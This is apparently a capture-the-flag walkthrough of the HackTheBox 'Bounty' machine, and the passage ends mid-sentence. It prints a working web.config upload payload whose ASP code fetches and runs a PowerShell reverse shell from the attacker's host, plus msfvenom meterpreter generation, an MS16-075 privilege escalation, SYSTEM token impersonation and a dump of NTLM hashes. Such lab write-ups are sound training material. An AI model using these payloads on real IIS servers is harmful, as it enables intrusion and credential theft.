# Bounty | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.65.73
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-19 14:15 UTC
Nmap scan report for 10.129.65.73
Host is up (0.22s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   224.54 ms 10.10.14.1
2   224.60 ms 10.129.65.73

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.91 seconds
```
The machine is running an IIS web server on port 80.

### 2. Enumeration
When visiting the machine's webpage via port 80, there is a nice picture of merlin the wizard. Checking out the headers:
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ curl --head http://10.129.65.73
HTTP/1.1 200 OK
Content-Length: 630
Content-Type: text/html
Last-Modified: Thu, 31 May 2018 03:46:26 GMT
Accept-Ranges: bytes
ETag: "20ba8ef391f8d31:0"
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Sat, 19 Dec 2020 14:41:02 GMT
```
The server returns the X-Powered-By header as ASP.NET.  
With this information I can dirbust the server for directories and also aspx files.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.65.73/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.65.73/
[+] Threads:        30
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx
[+] Timeout:        10s
===============================================================
2020/12/19 15:03:05 Starting gobuster
===============================================================
/transfer.aspx (Status: 200)
/UploadedFiles (Status: 301)
/uploadedFiles (Status: 301)
/uploadedfiles (Status: 301)
===============================================================
2020/12/19 15:58:38 Finished
===============================================================
```
Gobuster is able to find a transfer.aspx page, as well as an /uploadedfiles directory, which is not listable. The transfer.aspx page has a file upload form. First I try to upload a html page with some test text, which fails with the error "Invalid File". I try various extensions, starting with txt, aspx, and then .jpg, which succeeds. This tells me the app isn't using file headers to validate uploads and is just fitering based on extension.  
Using burp intruder with the "raft-small-extensions-lowercase.txt" wordlist, I can test some common web extensions and see what is allowed past the filer. The following can be uploaded:
- jpg
- gif
- png
- doc
- config
- xls/xlsx
  
After doing some research into exploits leveraging these file types, a find a blog post detailing how a guy claimed a bug bounty by getting RCE with a .config file upload - https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/:
  
*By uploading a web.config I was able to bypass the blacklist, which blocks files with an executable extension (such as ‘.asp’ and ‘.aspx’).
After setting execution rights to ‘.config’ and then adding asp code in the web.config I was able to execute code.*

### 3. Get a shell
The first step is to create a .config file - there is a template linked to by the article. I can modify it to run powershell, which will download and execute my reverse shell script.
```asp
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.162:8000/rev.ps1')")
%>
```
I set up my web server, and upload the file. When I browse to the file in the /uploadedfiles directory, I get a hit on my web server. Shortly after, I get a connection in my nc listener.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-xbv7f4azqp]─[~/writeups/HackTheBox/HTB_Bounty]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.65.73] 49158
whoami
bounty\merlin
```

### 4. Enumeration
First check the system info and privileges:
```shell
systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          12/20/2020, 1:31:38 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,555 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,553 MB
Virtual Memory: In Use:    542 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.65.179
                                 [02]: fe80::e5c1:9498:385c:edce
                                 [03]: dead:beef::e5c1:9498:385c:edce

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
The machine is running Windows 2008 Server R2. The user has the SeImpersonatePrivilege set.  
Checking the version of powershell:
```shell
powershell.exe $PSVersionTable

Name                           Value                                           
----                           -----                                           
CLRVersion                     2.0.50727.4927                                  
BuildVersion                   6.1.7600.16385                                  
PSVersion                      2.0                                             
WSManStackVersion              2.0                                             
PSCompatibleVersions           {1.0, 2.0}                                      
SerializationVersion           1.1.0.1                                         
PSRemotingProtocolVersion      2.1
```
I would like to do some better enumeration, to do this I decide to drop a meterpreter payload on the machine. Because of Powershell v2 the command to download something to the machine is different.
```bash
─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-hlstiq4d2b]─[~/writeups/HackTheBox/HTB_Bounty]
└──╼ [★]$ msfvenom --arch x64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.162 LPORT=9998 -f exe > rev2.exe
No encoder or badchars specified, outputting raw payload
Payload size: 201283 bytes
Final size of exe file: 207872 bytes
```
Download and execute on the target:
```shell
powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.162:8080/rev2.exe','C:\Windows\Temp\rev2.exe')

dir


    Directory: C:\Windows\Temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         6/10/2018   3:44 PM            vmware-SYSTEM                     
-a---         5/30/2018   3:19 AM          0 DMI5FAC.tmp                       
-a---        12/20/2020   3:22 PM     207872 rev2.exe                          
-a---         6/10/2018   3:44 PM     203777 vminst.log                        
-a---        12/20/2020   1:31 PM      59269 vmware-vmsvc.log                  
-a---         6/11/2018  12:47 AM      22447 vmware-vmusr.log                  
-a---        12/20/2020   1:31 PM       1001 vmware-vmvss.log                  

.\rev2.exe
```

[*] Started reverse TCP handler on 10.10.14.162:9998 
[*] Meterpreter session 1 opened (10.10.14.162:9998 -> 10.129.65.179:49184) at 2020-12-20 13:20:00 +0000

meterpreter > getuid
Server username: BOUNTY\merlin
```
I can then use MSF's local exploit suggester.
```bash
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.65.179 - Collecting local exploits for x64/windows...
[*] 10.129.65.179 - 15 exploit checks are being tried...
[+] 10.129.65.179 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.65.179 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.65.179 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.65.179 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.129.65.179 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```
Of these, the machine appears to be vulnerable to five exploits in the MSF database. A few of these don't achieve privilege escalation. I decide to go with ms16-075. This won't get me to SYSTEM straight away but it will allow me to take a SYSTEM impersonation token and elevate that way.

### 5. Get SYSTEM
```bash
msf5 exploit(windows/local/ms16_075_reflection) > run

[*] Started reverse TCP handler on 10.10.14.162:9090 
[*] x64
[*] Launching notepad to host the exploit...
[+] Process 2104 launched.
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (201283 bytes) to 10.129.65.179
[*] Meterpreter session 2 opened (10.10.14.162:9090 -> 10.129.65.179:49195) at 2020-12-20 13:38:42 +0000

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
BOUNTY\merlin

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:89dd4e73364721f8e2abe67d7090b686:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
merlin:1000:aad3b435b51404eeaad3b435b51404ee:2d588983dbc4d1356b19277afef85092:::
```

## Notes
After completing this machine I went looking for a way to do it without using metasploit. On payloadsallthethings I found a token handling exploit called JuicyPotato:
